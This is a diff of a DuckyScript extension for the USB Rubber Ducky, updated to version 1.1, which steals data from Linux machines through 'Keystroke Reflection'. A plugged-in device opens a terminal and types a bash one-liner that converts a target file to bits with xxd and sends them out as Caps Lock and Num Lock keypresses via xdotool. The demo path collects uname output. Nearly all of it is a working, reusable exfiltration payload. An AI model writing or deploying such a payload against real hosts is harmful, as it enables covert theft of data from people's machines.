@@ -1,44 +1,94 @@
 EXTENSION LINUX_HID_EXFIL
-    REM VERSION 1.0
+    REM VERSION 1.1
+    REM AUTHOR: Korben
 
-    REM REQUIRES EXFIL_AUTO_EOF_DETECT EXTENSION
+    REM REQUIRES EXTENSION EXFIL_AUTO_EOF_DETECT
 
-    REM Helpers for Linux Keystroke Reflection data exfiltration 
-    REM This payload is a proof of concept for USB HID only Data Exfiltration 
+    REM_BLOCK DOCUMENTATION
+        Helpers for Linux Keystroke Reflection data exfiltration
+        This payload is a proof of concept for USB HID only Data Exfiltration
 
-    REM TARGET:
-    REM Linux Host that supports opening terminal via CTRL ALT t, and xdotool
+        TARGET:
+            Linux host that supports opening terminal via CTRL ALT t, and xdotool
 
-    REM USAGE:
-    REM Uncomment the function call below to run this extension inline 
-    REM or call RUN_LINUX_EXFIL() anywhere in your payload after the extension 
+        USAGE:
+            REQUIRES EXFIL_AUTO_EOF_DETECT EXTENSION
+            Prepare data to exfil (in filename defined by TARGET_FILE below)
+            with a terminal window already open - call RUN_LINUX_EXFIL()
 
-    REM DEPLOYMENT:
-    REM Plug Ducky into host, wait for the LED to turn (and stay) solid Green.
+        DEPLOYMENT:
+            Plug Ducky into host, wait for the LED to turn (and stay) solid Green.
+    END_REM
 
     REM CONFIGURATION:
     REM File on host machine to exfil using Keystroke Reflection attack
-    DEFINE TARGET_FILE t.txt
-    DEFINE TERMINAL_OPEN_DELAY 500
-    DEFINE READY_TO_TYPE_DELAY 250
+    DEFINE #TARGET_FILE filename.txt
+
+    DEFINE #SAVE_AND_RESTORE_LOCKS TRUE
+    DEFINE #ENABLE_EXFIL_LEDS TRUE
+    DEFINE #CLOSE_TERMINAL_AFTER_EXFIL TRUE
+
+    REM if TRUE will open terminal, prepare data in #TARGET_FILE, and RUN_LINUX_EXFIL()
+    DEFINE #RUN_SIMPLE_USAGE_DEMO FALSE
+
     FUNCTION RUN_LINUX_EXFIL()
-        LED_OFF
-        DELAY READY_TO_TYPE_DELAY
-        CTRL ALT t
-        DELAY TERMINAL_OPEN_DELAY
-        SAVE_HOST_KEYBOARD_LOCK_STATE
+        IF_DEFINED_TRUE #ENABLE_EXFIL_LEDS
+            LED_OFF
+            $_EXFIL_LEDS_ENABLED = TRUE
+        END_IF_DEFINED
+
+        IF_DEFINED_TRUE #SAVE_AND_RESTORE_LOCKS
+            SAVE_HOST_KEYBOARD_LOCK_STATE
+        END_IF_DEFINED
+
         $_EXFIL_MODE_ENABLED = TRUE
-        $_EXFIL_LEDS_ENABLED = TRUE
-        STRINGLN uname -a > TARGET_FILE
-        STRINGLN c="xdotool key --delay 4";o=" Caps_Lock";l=" Num_Lock";bs=$(xxd -b TARGET_FILE |cut -d " " -f2-7);for (( i=0;i<${#bs};i++ ));do b="${bs:$i:1}";if [[ "$b" == "0" ]];then c+=$o;fi;if [[ "$b" == "1" ]];then c+=$l;fi;done;eval "$c";exit
+        STRING_BASH
+            c="xdotool key --delay 4";
+            bs=$(xxd -b 
+            #TARGET_FILE
+            |cut -d" " -f2-7);
+            for((i=0;i<${#bs};i++));do 
+                b="${bs:$i:1}";
+                if [[ "$b" == "0" ]];then 
+                    c+=" Caps_Lock";
+                fi;
+                if [[ "$b" == "1" ]];then 
+                    c+=" Num_Lock";
+                fi;
+            done;
+            $c;
+        END_STRING
+
+        IF_DEFINED_TRUE #CLOSE_TERMINAL_AFTER_EXFIL
+            STRING exit;
+        END_IF_DEFINED
+
+        ENTER
+
+        REM Requires adding EXFIL_AUTO_EOF_DETECT EXTENSION above this one
         WAIT_FOR_EOF()
-        $_EXFIL_LEDS_ENABLED = FALSE
+
         $_EXFIL_MODE_ENABLED = FALSE
-        RESTORE_HOST_KEYBOARD_LOCK_STATE
+
+        IF_DEFINED_TRUE #ENABLE_EXFIL_LEDS
+            $_EXFIL_LEDS_ENABLED = FALSE
+        END_IF_DEFINED
+
+        IF_DEFINED_TRUE #SAVE_AND_RESTORE_LOCKS
+            RESTORE_HOST_KEYBOARD_LOCK_STATE
+        END_IF_DEFINED
     END_FUNCTION
 
-    REM Uncomment the function call below to run this extension inline (here) 
-    REM or call RUN_WINDOWS_EXFIL() anywhere in your payload after the extension 
-
-    REM RUN_LINUX_EXFIL()
+    IF_DEFINED_TRUE #RUN_SIMPLE_USAGE_DEMO
+        REM DO NOT MODIFY THIS DEMO - copy and move outside extension if using as template.
+        REM DEMO Boot Delay
+        DELAY 3000
+        REM Open Terminal
+        CTRL ALT t
+        DELAY 500
+        REM Perpare some data in TARGET_FILE
+        STRINGLN uname -a>#TARGET_FILE
+        REM Exfil data to USB Rubber Ducky using Keystroke Reflection
+        RUN_LINUX_EXFIL()
+    END_IF_DEFINED
 END_EXTENSION
